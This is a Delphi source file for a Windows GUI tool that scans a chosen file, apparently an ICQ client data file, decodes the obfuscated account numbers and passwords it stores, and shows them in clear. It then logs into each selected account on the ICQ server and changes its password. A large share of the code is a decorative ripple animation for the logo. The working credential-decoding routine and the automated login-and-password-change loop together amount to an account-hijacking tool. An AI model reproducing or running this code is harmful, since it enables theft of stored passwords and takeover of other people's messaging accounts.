unit Main_u;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, XPMan, ComCtrls, ICQClient, ICQWorks, exUtils,
  Logo_u, Math;

type
  TwndMain = class(TForm)
    pnlLogo: TPanel;
    imgLogo: TImage;
    bvlLine: TBevel;
    leFile: TLabeledEdit;
    btnBrows: TButton;
    dlgOpen: TOpenDialog;
    btnFindPasswords: TButton;
    btnNext: TButton;
    mmoLog: TMemo;
    lvAccounts: TListView;
    lblCheck: TLabel;
    tmrRain: TTimer;
    procedure btnBrowsClick(Sender: TObject);
    procedure leFileChange(Sender: TObject);
    procedure btnFindPasswordsClick(Sender: TObject);
    procedure btnNextClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure imgLogoMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure imgLogoMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure imgLogoMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure tmrRainTimer(Sender: TObject);
    procedure FormActivate(Sender: TObject);
  private
    procedure init;
    procedure initBitmap;
    procedure initWavesArray;
    procedure initWavesData;
    procedure initBackgroundLines;
    procedure initBitmapLines;
    procedure simul;
    procedure simulEdges;
    procedure ripple(centerX, centerY, radius: integer; height: double);
    procedure render;
    procedure idle(sender: TObject; var done: boolean);
    { Private declarations }
  public
    ICQ : TICQClient;
    procedure _OnLogin(Sender: TObject);
    procedure _OnConnectionFailed(Sender: TObject);
    procedure _OnError(Sender: TObject; ErrorType: TErrorType;
              ErrorMsg: String);
    procedure _OnInfoChanged(Sender: TObject; InfoType: TInfoType;
              ChangedOk: Boolean);
    procedure _OnLogOff(Sender: TObject);
    { Public declarations }
  end;

type  
  TWave = record
    height: double;
    speed : double;
  end;

var
  wndMain: TwndMain;
  connected:Boolean;
  _pass:ShortString;
  //******
  bitmapWidth    : integer;
  bitmapHeight   : integer;
  backgroundLines: array of PByteArray;
  bitmapLines    : array of PByteArray;
  backgroundBitmap: TBitmap;
  backgroundsNames: TStringList;
  waves: array of array of TWave;
  lightIntensity: double;
  depth         : double;
  viscosity     : double;
  wavesSpeed    : double;
  leftDown      : boolean;
  anim          :boolean;
implementation

uses Pass_u;

{$R *.dfm}

function Alphabet(b:byte):char;
begin
  Result := Char(b);
  case b of
    $ce:Result := '0';
    $cd:Result := '1';
    $cc:Result := '2';
    $cb:Result := '3';
    $ca:Result := '4';
    $c9:Result := '5';
    $c8:Result := '6';
    $c7:Result := '7';
    $c6:Result := '8';
    $c5:Result := '9';
    
    $9d:Result := 'a';
    $9c:Result := 'b';
    $9b:Result := 'c';
    $9a:Result := 'd';
    $99:Result := 'e';
    $98:Result := 'f';
    $97:Result := 'g';
    $96:Result := 'h';
    $95:Result := 'i';
    $94:Result := 'j';
    $93:Result := 'k';
    $92:Result := 'l';
    $91:Result := 'm';
    $90:Result := 'n';
    $8f:Result := 'o';
    $8e:Result := 'p';
    $8d:Result := 'q';
    $8c:Result := 'r';
    $8b:Result := 's';
    $8a:Result := 't';
    $89:Result := 'u';
    $88:Result := 'v';
    $87:Result := 'w';
    $86:Result := 'x';
    $85:Result := 'y';
    $84:Result := 'z';

    $bd:Result := 'A';
    $bc:Result := 'B';
    $bb:Result := 'C';
    $ba:Result := 'D';
    $b9:Result := 'E';
    $b8:Result := 'F';
    $b7:Result := 'G';
    $b6:Result := 'H';
    $b5:Result := 'I';
    $b4:Result := 'J';
    $b3:Result := 'K';
    $b2:Result := 'L';
    $b1:Result := 'M';
    $b0:Result := 'N';
    $af:Result := 'O';
    $ae:Result := 'P';
    $ad:Result := 'Q';
    $ac:Result := 'R';
    $ab:Result := 'S';
    $aa:Result := 'T';
    $a9:Result := 'U';
    $a8:Result := 'V';
    $a7:Result := 'W';
    $a6:Result := 'X';
    $a5:Result := 'Y';
    $a4:Result := 'Z';

    $a3:Result := '[';
    $a2:Result := '\';
    $a1:Result := ']';
    $a0:Result := '^';
    $9f:Result := '_';
    $9e:Result := '`';

    $be:Result := '@';
    $bf:Result := '?';
    $c0:Result := '>';
    $c1:Result := '=';
    $c2:Result := '<';
    $c3:Result := ';';
    $c4:Result := ':';
    
    $cf:Result := '/';
    $d0:Result := '.';
    $d1:Result := '-';
    $d2:Result := ',';
    $d3:Result := '+';
    $d4:Result := '*';
    $d5:Result := ')';
    $d6:Result := '(';
    $d7:Result := #39;
    $d8:Result := '&';
    $d9:Result := '%';
    $da:Result := '$';
    $db:Result := '#';
    $dc:Result := '"';
    $de:Result := '!';
  end;
end;

function Decode(s:string):string;
var i,l:Integer;
begin
  l := Length(s);
  Result := '';
  for i := 1 to l do
    Result := Result + Alphabet(Byte(s[i])+(i-1));
end;

procedure TwndMain.idle(sender: TObject; var done: boolean);
begin
  if not anim then Exit;
  simulEdges;
  simul;
  render;
  done := false;
end;

procedure TwndMain.init;
var a:Cardinal;
    f:TStream;
begin
  Randomize;
  backgroundBitmap := TBitmap.Create;
  bitmapWidth  := imgLogo.width;
  bitmapHeight := imgLogo.height;
  initBitmap();
  initBitmapLines();
  viscosity := 0.01;
  wavesSpeed := 150;
  lightIntensity := 150;
  depth := 5;
  f := TMemoryStream.Create;
  f.Write(logo_data,43255);
  f.Position := 0;
  backgroundBitmap.LoadFromStream(f);
  //imgLogo.Picture.Assign(backgroundBitmap);
  f.Free;
  initBackGroundLines();
  initWavesArray();
  initWavesData();
  simulEdges;
  simul;
  render;
  Application.OnIdle := idle;
  anim := False;
end;

procedure TwndMain.initWavesArray;
var
  x: integer;
begin
  setLength(waves, bitmapWidth+1);
  for x:=0 to bitmapWidth do
    setLength(waves[x], bitmapHeight+1);
end;

procedure TwndMain.initWavesData;
var
  x: integer;
  y: integer;
begin
  for x:=0 to bitmapWidth do
    for y:=0 to bitmapHeight do
    begin
      waves[x, y].height := 0.0;
      waves[x, y].speed := 0.0;
    end;
end;

procedure TwndMain.initBitmap;
var
  bit: TBitmap;
begin
  bit := TBitmap.create();
  bit.width := bitmapWidth;
  bit.height := bitmapHeight;
  bit.PixelFormat := pf24bit;
  imgLogo.Picture.Assign(bit);
  bit.free();
end;

procedure TwndMain.initBackgroundLines;
var
  i: integer;
begin
  setLength(backgroundLines, backgroundBitmap.Height);
  for i:=0 to backgroundBitmap.Height-1 do
    backgroundLines[i] := backgroundBitmap.ScanLine[i];
end;

procedure TwndMain.initBitmapLines;
var
  i: integer;
begin
  setLength(bitmapLines, bitmapHeight);
  for i:=0 to bitmapHeight-1 do
    bitmapLines[i] := imgLogo.Picture.Bitmap.ScanLine[i];
end;

procedure TwndMain.simul;
var
  x: integer;
  y: integer;
  d1: double;
  d2: double;
  ddx: double;
  ddy: double;
  viscosity1: double;
begin
  for x:=1 to bitmapWidth-1 do
  for y:=1 to bitmapHeight-1 do
  begin
    d1 := waves[x+1, y].height - waves[x, y].height;
    d2 := waves[x, y].height   - waves[x-1, y].height;
    ddx := d1 - d2;
    d1 := waves[x, y+1].height - waves[x, y].height;
    d2 := waves[x, y].height   - waves[x, y-1].height;
    ddy := d1 - d2;
    waves[x, y].speed := waves[x, y].speed + ddx/wavesSpeed + ddy/wavesSpeed;
  end;
  viscosity1 := 1.0-viscosity;  
  for x:=1 to bitmapWidth-1 do
    for y:=1 to bitmapHeight-1 do
    begin
      waves[x, y].height := (waves[x, y].height + waves[x, y].speed)*viscosity1;
    end;
end;

procedure TwndMain.simulEdges;
var
  x: integer;
begin
  for x:=1 to bitmapWidth-1 do
  begin
    waves[x, 0] := waves[x, 1];
    waves[x, bitmapHeight] := waves[x, bitmapHeight-1];
  end;
  for x:=0 to bitmapHeight do
  begin
    waves[0, x] := waves[1, x];
    waves[bitmapWidth, x] := waves[bitmapWidth-1, x];
  end;
end; 

procedure TwndMain.ripple(centerX, centerY, radius: integer; height: double);
var
  x: integer;
  y: integer;
begin
  for x:=(centerX-radius) to centerX+radius-1 do
  begin
    if (x>=0) and (x<=bitmapWidth) then
    for y:=centerY-radius to centerY+radius-1 do
      if (y>=0) and (y<=bitmapHeight) then
        waves[x, y].height := waves[x, y].height +( (Cos((x-centerX+radius)/(2*radius)*2*PI - PI)+1)*(Cos((y-centerY+radius)/(2*radius)*2*PI - PI)+1)*height );
  end;
end;

procedure TwndMain.render;
var
  x: integer;
  y: integer;
  dx: double;
  dy: double;
  light: integer;
  xMap: integer;
  yMap: integer;
begin
  for y:=0 to bitmapHeight-1 do
  begin
    for x:=0 to bitmapWidth-1 do
    begin
      dx := waves[x+1, y].height-waves[x, y].height;
      dy := waves[x, y+1].height-waves[x, y].height;
      xMap := x + round(dx*(waves[x,y].height+depth));
      yMap := y + round(dy*(waves[x,y].height+depth));

      light := round(dx*lightIntensity + dy*lightIntensity);
      if xMap>=0 then
        xMap := xMap mod backgroundBitmap.Width
        else
        xMap := backgroundBitmap.Width-((-xMap) mod backgroundBitmap.Width)-1;
      if yMap>=0 then
        yMap := yMap mod backgroundBitmap.Height
        else
        yMap := backgroundBitmap.Height-((-yMap) mod backgroundBitmap.Height)-1;
      bitmapLines[y][x*3+0] := min(255, max(0, backgroundLines[yMap][xMap*3+0] + light));
      bitmapLines[y][x*3+1] := min(255, max(0, backgroundLines[yMap][xMap*3+1] + light));
      bitmapLines[y][x*3+2] := min(255, max(0, backgroundLines[yMap][xMap*3+2] + light));
    end;
  end;
  imgLogo.Refresh();
end;

procedure TwndMain.btnBrowsClick(Sender: TObject);
begin
  if not dlgOpen.Execute then Exit;
  leFile.Text := dlgOpen.FileName;
end;

procedure TwndMain.leFileChange(Sender: TObject);
begin
  btnFindPasswords.Enabled := FileExists(leFile.Text);
end;

procedure TwndMain.btnFindPasswordsClick(Sender: TObject);
var _file:TFileStream;
    b:Byte;
    data,pass:string;
    buff:array[0..6] of Byte;
    _item:TListItem;
    i:Integer;
begin
  lvAccounts.Clear;
  mmoLog.Show;
  lvAccounts.Hide;
  lblCheck.Hide;
  btnNext.Enabled := False;
  mmoLog.Lines.add('ї Trying to open file...');
  try
    _file := TFileStream.Create(leFile.Text,fmOpenRead);
  except
    mmoLog.Lines.add('ї Failed to open...');
  end;
  mmoLog.Lines.add('ї Opening successfull...');
  mmoLog.Lines.add(' Ы Start scan.');
  while _file.Position <> _file.Size do
  begin
    _file.Read(b,1);
    if not (b in [1..40]) then Continue;
    SetLength(data,b);
    _file.Read(data[1],b);
    FillChar(buff,7,0);
    if _file.Read(buff[0],7) < 7 then Break;
    if not((buff[0]=0)and(buff[1]=2)and(buff[2]=0)and(buff[3]=0)and(buff[4]=0)and(buff[5]=3)and(buff[6]=0))then
    begin
      _file.Position := _file.Position - (b+7);
      Continue;
    end;
    _file.Read(b,1);
    SetLength(pass,b);
    _file.Read(pass[1],b);
    pass := Decode(pass);
    data := Decode(data);
    if (Length(Pass)>=1)and(Length(Data)>=3) then
    begin
      mmoLog.Lines.add('   * Found account: ' + data);
      mmoLog.Lines.Add('      Ы    Password: ' + pass);
      _item := lvAccounts.Items.Add;
      _item.Caption := data;
      _item.SubItems.Add(pass);
      _item.Checked := TryStrToInt(data,i);
    end;
  end;
  _file.Free;
  mmoLog.Lines.add(' ї Scan finished.');
  btnNext.Enabled := (lvAccounts.Items.Count > 0);
  btnNext.Tag := 0;
  mmoLog.Lines.Add('~~~Press "Next" button for check ICQ accounts~~~');
  mmoLog.Lines.Add('***');
end;

procedure TwndMain.btnNextClick(Sender: TObject);
var i,c,_val,_uin:Integer;
    uin,pass:string;
begin
  case btnNext.Tag of
  0:begin
      mmoLog.Hide;
      lvAccounts.Show;
      lblCheck.Show;
      btnNext.Tag := btnNext.Tag + 1;
      Exit;
    end;
  1:begin
      lvAccounts.Hide;
      lblCheck.Hide;
      mmoLog.Show;
      btnNext.Tag := btnNext.Tag + 2;
      btnNext.Caption := 'Stop';
      c := lvAccounts.Items.Count;
      for i := 0 to c - 1 do
      begin
        if not lvAccounts.Items[i].Checked then Continue;
        uin := lvAccounts.Items[i].Caption;
        if not TryStrToInt(uin,_uin) then
        begin
          mmoLog.Lines.Add('Error ї "'+uin+'" - is not valid ICQ uin.');
          Continue;
        end;
        pass := lvAccounts.Items[i].SubItems[0];
        connected := True;
        ICQ.ScreenName := uin;
        ICQ.UIN := _uin;
        ICQ.Password := pass;
        mmoLog.Lines.Add('ї Trying to logging in.');
        ICQ.Login(S_INVISIBLE);
        while connected do
          Application.HandleMessage;
      end;
      mmoLog.Lines.Add('~~~Press "Finish" button to exit~~~');
      mmoLog.Lines.Add('***');
      mmoLog.Lines.Add('~~~Don''t forget Your passwords :-)~~~');
      btnNext.Tag := btnNext.Tag - 1;
      btnNext.Caption := 'Finish!';
    end;
    2: Close;
    3: begin ICQ.Disconnect; connected := False; end;
  end;
end;

procedure TwndMain.FormCreate(Sender: TObject);
begin
  ICQ := TICQClient.Create(Self);
  ICQ.ICQServer := 'login.icq.com';
  ICQ.ICQPort := 5190;
  ICQ.OnLogin := _OnLogin;
  ICQ.OnError := _OnError;
  ICQ.OnConnectionFailed := _OnConnectionFailed;
  ICQ.OnInfoChanged := _OnInfoChanged;
  ICQ.OnLogOff := _OnLogOff;
  init;
end;

procedure TwndMain._OnLogin(Sender: TObject);
begin
  mmoLog.Lines.Add('  Ы Logging successfull.');
  //Exit;
  //icq.ChangePassword();
  // show password dialog
  //ћы залогились и кагбэ мен€ем пароль и выходим из аськи:-)
  Application.CreateForm(TdlgPassword, dlgPassword);
  dlgPassword.lePassword.EditLabel.Caption := 'New password for: ' + IntTOStr(ICQ.UIN);
  if dlgPassword.ShowModal = mrOk then
  begin
    ICQ.ChangePassword(dlgPassword.lePassword.Text);
    _pass := dlgPassword.lePassword.Text;
  end;
  dlgPassword.Free;
end;

procedure TwndMain._OnLogOff(Sender: TObject);
begin
  connected := false;
end;

procedure TwndMain._OnConnectionFailed(Sender: TObject);
begin
  mmoLog.Lines.Add('ї Logging out successfull.');
  connected := False;
end;

procedure TwndMain._OnError(Sender: TObject; ErrorType: TErrorType;
  ErrorMsg: String);
begin
  mmoLog.Lines.Add('ї Error: '+AnsiLowerCase(ErrorMsg));
  connected := false;
end;

procedure TwndMain._OnInfoChanged(Sender: TObject; InfoType: TInfoType;
  ChangedOk: Boolean);
begin
  if InfoType <> INFO_PASSWORD then Exit;
  if ChangedOk then
  begin
    mmoLog.Lines.Add('ї Password changing successfull.');
    mmoLog.Lines.Add(' * Account: '+inttostr(ICQ.UIN));
    mmoLog.Lines.Add('   Ы New password: '+_pass);
    _pass := '';
  end
  else
    mmoLog.Lines.Add('ї Password changing failed.');
  ICQ.LogOff;
end;

procedure TwndMain.FormClose(Sender: TObject; var Action: TCloseAction);
var i,y:integer;
    rect:trect;
begin
  ICQ.LogOff;
  connected := False;
  getwindowrect(handle,rect);
  y:=(screen.Height-Height)shr 1;
  for i:=255 downto 0 do
  begin
	  setwindowpos(handle,HWND_TOP,
		      rect.Left+round(y*(1-i/255)*cos(i*pi/127.5)),
		      rect.Top+round(y*(1-i/255)*sin(i*pi/127.5)),
		      Width,Height,
		      SWP_NOSENDCHANGING );
	  AlphaBlendValue:=i;
	  Application.ProcessMessages;
    Sleep(3);
  end;
end;

procedure TwndMain.imgLogoMouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
  if Button = mbRight then
    anim := not anim;
  tmrRain.Interval := 1000;
  tmrRain.Enabled := anim;
  if not anim then exit;
  ripple(x, y, 3, 10);
  leftDown := (Button = mbLeft);
end;

procedure TwndMain.imgLogoMouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
  if leftDown then
    ripple(x, y, 3, 10);
end;

procedure TwndMain.imgLogoMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
  leftDown := False;
end;

procedure TwndMain.tmrRainTimer(Sender: TObject);
begin
  ripple(Random(imgLogo.Width), Random(imgLogo.Height), 3, 10);
end;

procedure TwndMain.FormActivate(Sender: TObject);
var i,x,y:integer;
begin
  x:=(screen.Width-Width)shr 1;
  y:=(screen.Height-Height)shr 1;
  for i:=0 to 255 do begin
    setwindowpos(handle,HWND_TOP,
            x+round(y*(1-i/255)*cos(i*pi/127.5)),
            y+round(y*(1-i/255)*sin(i*pi/127.5)),
            Width,Height,
            SWP_NOSENDCHANGING );
    AlphaBlendValue:=i;
    Application.ProcessMessages;
    sleep(3);
  end;
end;

end.
